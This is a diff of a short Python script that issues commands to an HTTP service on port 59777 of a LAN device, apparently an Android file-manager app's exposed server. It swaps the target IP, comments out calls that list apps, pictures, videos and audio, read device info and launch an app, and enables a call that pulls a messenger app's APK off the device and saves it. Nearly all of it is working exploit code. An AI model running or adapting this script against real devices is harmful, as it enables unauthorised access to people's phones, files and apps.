@@ -7,7 +7,7 @@
 import requests
 import json
 
-TARGET_HOST = "http://172.21.33.3:59777"
+TARGET_HOST = "http://192.168.253.9:59777"
 
 
 def CommandRequest(**kwargs):
@@ -25,24 +25,24 @@ def ModifyResponse(response):
 
 if __name__ == "__main__":
     listApps = json.loads(CommandRequest(command="listApps"))
-    listAppsAll = json.loads(CommandRequest(command="listAppsAll"))
-    listPics = json.loads(ModifyResponse(CommandRequest(command="listPics")))
-    listVideos = json.loads(ModifyResponse(CommandRequest(command="listVideos")))
-    listAudios = json.loads(ModifyResponse(CommandRequest(command="listAudios")))
+    # listAppsAll = json.loads(CommandRequest(command="listAppsAll"))
+    # listPics = json.loads(ModifyResponse(CommandRequest(command="listPics")))
+    # listVideos = json.loads(ModifyResponse(CommandRequest(command="listVideos")))
+    # listAudios = json.loads(ModifyResponse(CommandRequest(command="listAudios")))
 
-    getDeviceInfo = json.loads(CommandRequest(command="getDeviceInfo"))
-    appLaunch = json.loads(CommandRequest(command="appLaunch", appPackageName="com.estrongs.android.pop"))
+    # getDeviceInfo = json.loads(CommandRequest(command="getDeviceInfo"))
+    # appLaunch = json.loads(CommandRequest(command="appLaunch", appPackageName="com.estrongs.android.pop"))
 
-    # appPull = CommandRequest(command="appPull", appPackageName="com.tencent.mm")  # 获取目标apk
-    # with open("WeChat.apk", "wb") as f:
-    #     f.write(appPull)
+    # print(appLaunch)
+    # print(listApps)
+    # print(listAppsAll)
+    # print(listPics)
+    # print(listVideos)
+    # print(listAudios)
 
-    print(appLaunch)
-    print(listApps)
-    print(listAppsAll)
-    print(listPics)
-    print(listVideos)
-    print(listAudios)
+    appPull = CommandRequest(command="appPull", appPackageName='com.bullet.messenger')  # 获取目标apk
+    with open("com.bullet.messenger.apk", "wb") as f:
+        f.write(appPull)
 
     # url = "http://172.30.166.2:42135/hostname"
     # data = "172.30.166.1"
